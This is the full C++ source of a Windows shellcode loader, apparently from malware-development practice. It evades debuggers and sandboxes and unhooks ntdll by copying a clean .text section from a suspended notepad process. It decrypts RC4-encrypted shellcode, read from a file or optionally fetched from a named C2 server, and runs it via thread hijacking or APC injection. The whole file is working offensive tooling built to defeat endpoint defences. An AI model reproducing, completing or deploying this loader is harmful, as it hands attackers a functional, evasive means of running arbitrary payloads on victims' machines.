#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#include "syscalls.h"

#pragma comment(lib, "winhttp.lib")

#define DEBUGGING 0
#define USEHTTP 0
#define CLEANNTDLL 1

// #define FIXED_URL "https://ghettoc2.net/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/ntdll.dll");
#define FIXED_FILENAME "entee.dat";

#define MAXSHELLCODESIZE 4096

#define _CRT_SECURE_NO_DEPRECATE
//#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

#pragma warning (disable : 4996)

using namespace std;

// External or forward declared routines
#if USEHTTP == 1
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
#endif

BOOL ClearNTDLL();

// For SystemFunction033 (built in RC4 decrypt)
typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, key;

unsigned char   buf[MAXSHELLCODESIZE];

BOOL timing_CreateWaitableTimer(UINT delayInMillis)
{
    HANDLE hTimer;
    LARGE_INTEGER dueTime;

    BOOL bResult = FALSE;

    dueTime.QuadPart = delayInMillis * -10000LL;

    hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

    if (hTimer == NULL)
    {
        return TRUE;
    }

    if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
    {
        bResult = TRUE;
    }
    else {
        if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
        {
            bResult = TRUE;
        }
    }

    CancelWaitableTimer(hTimer);
    CloseHandle(hTimer);
    return bResult;
}

//sandbox check to check hardrive 
BOOL getsandbox_drive_size() {
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;

    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {
        // Someone is playing tricks. Or not encoded_kwdikas enough privileges.
        CloseHandle(drive);
        return FALSE;
    }

    BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
    CloseHandle(drive);

    if (result != 0) {
        if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
            return FALSE;
    }

    return TRUE;
}

BOOL checkup()
{
    BOOL bIsDbgPresent = FALSE;

    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);

    if (bIsDbgPresent) {
#if DEBUGGING == 1
        fprintf(stderr, "Remote debugger found, %d\n", bIsDbgPresent);
#endif
        return FALSE;
    }

    if (timing_CreateWaitableTimer(4000)) {
#if DEBUGGING == 1
        fprintf(stderr, "CreateWaitable Timer event\n");
#endif
        return FALSE;
    }

    return TRUE;

}

#if CLEANNTDLL == 1
SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;

	fprintf(stderr, "GetNtdllSizeFromBaseAddress\n");
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		fprintf(stderr, "GetNtdllSizeFromBaseAddress pImgDosHdr error\n");
		return NULL;
	}
	
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		fprintf(stderr, "GetNtdllSizeFromBaseAddress pImgNtHdr error\n");
		return NULL;
	}
	fprintf(stderr, "GetNtdllSizeFromBaseAddress done\n");

	return pImgNtHdrs->OptionalHeader.SizeOfImage;
}

PVOID FetchLocalNtdllBaseAddress() {

	PPEB pPeb = (PPEB)__readgsqword(0x60);

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'SuspendedProcessUnhooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	fprintf(stderr, "FetchLocalNtdllBaseAddress\n");
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	fprintf(stderr, "FetchLocalNtdllBaseAddress done\n");

	return pLdr->DllBase;
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID       pLocalNtdll      = (PVOID)FetchLocalNtdllBaseAddress();
	NTSTATUS	ntstatus;
	HANDLE		curProc = GetCurrentProcess();

	fprintf(stderr, "ReplaceNtdllTxtSection\n");

	// getting the dos header
	PIMAGE_DOS_HEADER   pLocalDosHdr      = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS   pLocalNtHdrs      = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
			    pRemoteNtdllTxt  = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL;	// the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------
	
	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize ) {
		fprintf(stderr, "Not all required info found\n");
		return FALSE;
	}

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		fprintf(stderr, "Base address mismatch %llx - %llx\n", (unsigned __int64)pLocalNtdllTxt, (unsigned __int64)pRemoteNtdllTxt);
		return FALSE;
	}

//---------------------------------------------------------------------------------------------------------------------------
	
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
//	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
	ntstatus = NtProtectVirtualMemory(curProc, &pLocalNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NTDLL NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
#endif
		fprintf(stderr, "NTDLL NtProtectVirtualMemory (set) error, ntstatus is %lx\n", ntstatus);
		return FALSE;
    }

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// restoring the old memory protection
//	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
	ntstatus = NtProtectVirtualMemory(curProc, &pLocalNtdllTxt, &sNtdllTxtSize, dwOldProtection, &dwOldProtection);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NTDLL NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
#endif
		fprintf(stderr, "NTDLL NtProtectVirtualMemory (restore) error, ntstatus is %lx\n", ntstatus);
		return FALSE;
	}

	return TRUE;
}

// dummy function to use for the sacrificial thread we need to start our malicious shellcode
VOID DummyFunction() {

	// stupid code
	int		j = rand();
	int		i = j * j;

}

BOOL GetPayloadFromFile(char *szFilename, OUT PVOID* pNtdllBuffer, OUT PSIZE_T sNtdllSize) {

	BOOL		bSTATE = TRUE;
//	HINTERNET	hInternet = NULL, hInternetFile = NULL
	FILE		*infile;
	DWORD		dwBytesRead = NULL;
	SIZE_T		sSize = NULL; 	 			// Used as the total size counter
	PBYTE		pBytes = NULL,				// Used as the total heap buffer counter
		        pTmpBytes = NULL;			// Used as the tmp buffer (of size 1024)

/*
// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the ntdll file using theURL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
*/
	if ((infile = fopen(szFilename, "rb")) == NULL) {
		fprintf(stderr, "Error reading file %s\n", szFilename);
		return FALSE;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		return FALSE;
	}

	while (TRUE) {
		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if ((dwBytesRead = fread(pTmpBytes, sizeof(char), 1024, infile)) == 0) {
			if (ferror(infile)) {
				fprintf(stderr, "File %s read error %d\n", szFilename, errno);
				return FALSE;
			}
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole ntdll file bytes
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			return FALSE;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}
	fclose(infile);


	// Saving 
	*pNtdllBuffer = pBytes;
	*sNtdllSize = sSize;
}

BOOL ReadNtdllFromFile(char *szFilename, OUT PVOID* ppNtdllBuf) {

	PBYTE      pNtdllModule = (PBYTE)FetchLocalNtdllBaseAddress();
	PVOID      pNtdllBuffer = NULL;
	SIZE_T     sNtdllSize = NULL;

	// getting the dos header of the local ntdll image
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// getting the nt headers of the local ntdll image
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// 'GetPayloadFromFile' is used to read a local file
	if (!GetPayloadFromFile(szFilename, &pNtdllBuffer, &sNtdllSize))
		return FALSE;

	// 'sNtdllSize' will now contain the size of the downloaded ntdll.dll file
	// 'pNtdllBuffer' will now contain the base address of the downloaded ntdll.dll file

	*ppNtdllBuf = pNtdllBuffer;

	return TRUE;
}


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload) {

	CONTEXT		ThreadCtx;

	fprintf(stderr, "RunViaClassicThreadHijacking with code at %llx\n", (unsigned __int64)pPayload);

	ThreadCtx.ContextFlags = CONTEXT_ALL; // CONTEXT_CONTROL;

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		fprintf(stderr, "[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	fprintf(stderr, "Got thread context\n");
	fprintf(stderr, "Current RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = (DWORD64) pPayload;

	fprintf(stderr, "New RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
	getchar();

	/*
		- in case of a x64 payload injection : we change the value of `Rip`
		- in case of a x32 payload injection : we change the value of `Eip`
	*/

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		fprintf(stderr, "[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
#endif

unsigned long temp;

int main(int argc, char **argv)
{
	char _key[] = "advapi32.dll";
#if DEBUGGING == 1
	int i;
#endif

#if 0
	if (!checkup()) {
        fprintf(stderr, "Bailing out\n");
        return 0;
    }

	//	fprintf(stderr, "Unhooking\n");

#if DEBUGGING == 1
	printf("Start unhooking, press any key to continue...\n");
	getchar();
#endif

	// Unhook NTDLL via indirect syscalls
	if (!ClearNTDLL()) {
		printf("[-] Error unhooking.\n");
		return -1;
	}

	//	fprintf(stderr, "Unhooked\n");

#if DEBUGGING == 1
	printf("Unhooked, press any key to continue...\n");
	getchar();
#endif
#endif

    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary("advapi32"), "SystemFunction033");

    NTSTATUS        ntstatus;
    LPVOID          start_address = NULL;
    SIZE_T          code_size;
    DWORD           oldProtect = NULL;
	volatile unsigned long shellcode_size;

#if DEBUGGING == 1
    printf("Starting download\n");
#endif

#if USEHTTP == 0
	unsigned int  bytesread;
#endif

#if USEHTTP == 1
	std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
	shellcode_size = (unsigned long)(shellcode.size());
#else
	char *infile, defaultfile[] = "shellcode.enc";
	FILE *fp;

	infile = argc == 2 ? argv[1] : defaultfile;

	if ((fp = fopen(infile, "rb")) == NULL) {
		fprintf(stderr, "Cannot open input file %s\n", infile);
		exit(1);
	}

	if ((bytesread = fread(buf, sizeof(char), MAXSHELLCODESIZE, fp)) == 0) {
		if (ferror(fp)) {
			fprintf(stderr, "File %s read error %d\n", infile, errno);
		}
		else {
			fprintf(stderr, "File %s is empty\n", infile);
		}
		fclose(fp);
		exit(1);
	}

	fclose(fp);
	shellcode_size = (unsigned long)bytesread;
	temp = shellcode_size;
#endif

#if DEBUGGING == 1
    printf("Shellcode size is %d\n", shellcode_size);
#endif
	fprintf(stderr, "0. Shellcode size is %d\n", shellcode_size);

	if (shellcode_size == 0) {
		fprintf(stderr, "Shellcode size is 0, error\n");
		return 0;
	}
    if (shellcode_size > MAXSHELLCODESIZE) {
        fprintf(stderr, "Shellcode too big (%d bytes), max size is %d bytes\n", shellcode_size, MAXSHELLCODESIZE);
        return 0;
    }

    // create startup info struct
    LPSTARTUPINFOA startup_info = new STARTUPINFOA();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    char cmd[] = "notepad.exe";

    // create process
	if (!CreateProcessA(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED,
		NULL,
		NULL,
		startup_info,
		process_info)) {
		// fprintf(stderr, "Error %lx creating process\n", GetLastError());
		exit(0);
	}

#if DEBUGGING == 1
    printf("Started a suspended notepad, pid %d, check with processhacker or taskmanager and then press enter to continue...\n", GetProcessId(process_info->hProcess));
    getchar();
#endif

#if CLEANNTDLL == 1
	PVOID	pNtdllModule		= FetchLocalNtdllBaseAddress();
	PBYTE	pNtdllBuffer		= NULL;
	SIZE_T	sNtdllSize		    = NULL, sNumberOfBytesRead = NULL;
	
	fprintf(stderr, "[i] Fetching a clean \"ntdll.dll\" File From A Suspended Process, pid %d\n", GetProcessId(process_info->hProcess));

	// allocating enough memory to read ntdll from the remote process
	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
	if (!sNtdllSize) {
		fprintf(stderr, "GetNtdllSizeFromBaseAddress error\n");
		exit(1);
	}
	pNtdllBuffer = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
	if (!pNtdllBuffer) {
		fprintf(stderr, "HeapAlloc error\n");
		exit(1);
	}

	// reading a clean ntdll.dll
	if (!ReadProcessMemory(process_info->hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
		// Reading from memory fails
		fprintf(stderr, "[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		fprintf(stderr, "[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
		//exit(1);
		// try from clean file...
		char ntdllfile[MAX_PATH] = FIXED_FILENAME;

		if (!ReadNtdllFromFile(ntdllfile, (PVOID *)pNtdllBuffer)) {
			fprintf(stderr, "[!] ReadNtdllFromFile Failed with Error : %d \n", GetLastError());
			exit(1);
		}
	}

#if DEBUGGING == 1
	fprintf(stderr, "ntdll read into buffer %lx\n", pNtDllBuffer);
	getchar();
#endif

/*
	if (!ReadNtdllFromASuspendedProcess("notepad.exe", &pNtdll))
		return -1;
*/

	if (!ReplaceNtdllTxtSection(pNtdllBuffer)) {
		fprintf(stderr, "ReplaceNtdllTxtSection failed\n");
		exit(1);
	}

	//HeapFree(GetProcessHeap(), 0, pNtdll);

#if DEBUGGING == 1
	printf("[+] Ntdll Unhooked Successfully \n");
	printf("Press <Enter> to continue ...");
	getchar();
#endif

	// As we're cleaning our own NTDLL, we should also inject the shellcode in our own process, right?
	// We don't need the suspended notepad anymore, get a handle to our current process
	process_info->hProcess = GetCurrentProcess();

#endif

#if DEBUGGING == 1
	fprintf(stderr, "Injecting shellcode into process %d\n", GetProcessId(process_info->hProcess));
#endif
	fprintf(stderr, "Injecting shellcode into process %d\n", GetProcessId(process_info->hProcess));

    // Allocate Virtual Memory
    code_size = (SIZE_T)shellcode_size;
	fprintf(stderr, "1.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
	ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	fprintf(stderr, "1a.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d\n", (unsigned __int64)start_address, (unsigned int)code_size);
        printf("Press enter to continue...\n");
        getchar();
#endif
    }

	shellcode_size = temp;
	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
#if USEHTTP == 1
	std::copy(begin(shellcode), end(shellcode), buf);
#endif

	// decrypt the downloaded shellcode with SystemFunction033
	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof(_key);
	key.MaximumLength = sizeof(_key);

	shellcode_size = temp;
	fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
	temp = shellcode_size;

	_data.Buffer = (PUCHAR)buf;
	_data.Length = shellcode_size;
	_data.MaximumLength = shellcode_size;
	
#if DEBUGGING == 1
	int i;
	fprintf(stderr, "Key structure, size %d:\n", sizeof(key));
	struct ustring *p = &key;
	unsigned char *c = (unsigned char *)p;
	for (i = 0; i < sizeof(key); i++) {
		fprintf(stderr, "0x%02x ", c[i]);
	}
	fprintf(stderr, "\n");
	fprintf(stderr, "Data structure, size %d:\n",sizeof(_data));
	p = &_data;
	c = (unsigned char *)p;
	for (i = 0; i < sizeof(key); i++) {
		fprintf(stderr, "0x%02x ", c[i]);
	}
	fprintf(stderr, "\n");
#endif
	
	SystemFunction033(&_data, &key);

	shellcode_size = temp;
	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);

#if DEBUGGING == 1
	printf("Decrypted, press enter to continue...\n");
	getchar();
#endif

	shellcode_size = temp;
	fprintf(stderr, "Decrypted, shellcode size is %d\n", shellcode_size);

	// Copy encrypted shellcode into allocated memory
	//fprintf(stderr, "4.Shellcode size is %d\n", shellcode_size);
	ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %x\n", (unsigned int)ntstatus);
#endif
		return 0;
	}
	else {
#if DEBUGGING == 1
		fprintf(stderr, "Memory written with decrypted shellcode\n");
		printf("Press enter to continue...\n");
		getchar();
#endif
	}

	//fprintf(stderr, "Written, shellcode size is %d\n", shellcode_size);

    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "Memory Protected\n");
        printf("Press enter to continue...\n");
        getchar();
#endif
    }

	fprintf(stderr, "Memory protected at %llx, check with processhacker\n", (unsigned __int64)start_address);
	getchar();

#if CLEANNTDLL == 1
	// As we are injecting in our own process QueueUserAPC won't work
	// Create an innocent thread that and then replace it with our shellcode

	HANDLE		hThread = NULL;
	DWORD		dwThreadId = NULL;

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		fprintf(stderr, "[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	fprintf(stderr,"[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
	// hijacking the sacrificial thread created, point it to our shellcode
	if (!RunViaClassicThreadHijacking(hThread, (PBYTE)start_address)) {
		fprintf(stderr, "ThreadHijack error\n");
		return -1;
	}
	fprintf(stderr,"[+] DONE \n");
	fprintf(stderr,"[#] Press <Enter> To Run The Payload ... ");
	getchar();

	// resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
#else
    ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtQueueApcThread error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "APC thread queued\n");
#endif
    }

	fprintf(stderr, "In the queue!\n");
	getchar();

    ntstatus = NtResumeThread(process_info->hThread, NULL);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtResumeThread error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "Thread resumed\n");
#endif
    }
	fprintf(stderr, "Done\n");
	getchar();
#endif
    // close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
#if DEBUGGING == 1
    printf("All done, bye!\n");
    getchar();
#endif
    return 1;
}

#if USEHTTP == 1
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0); // no ssl
 //       WINHTTP_FLAG_SECURE);          // enable ssl

        // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        443,            // port 8000
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
    //    0); // no ssl
        WINHTTP_FLAG_SECURE);                   // ssl

        // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
#endif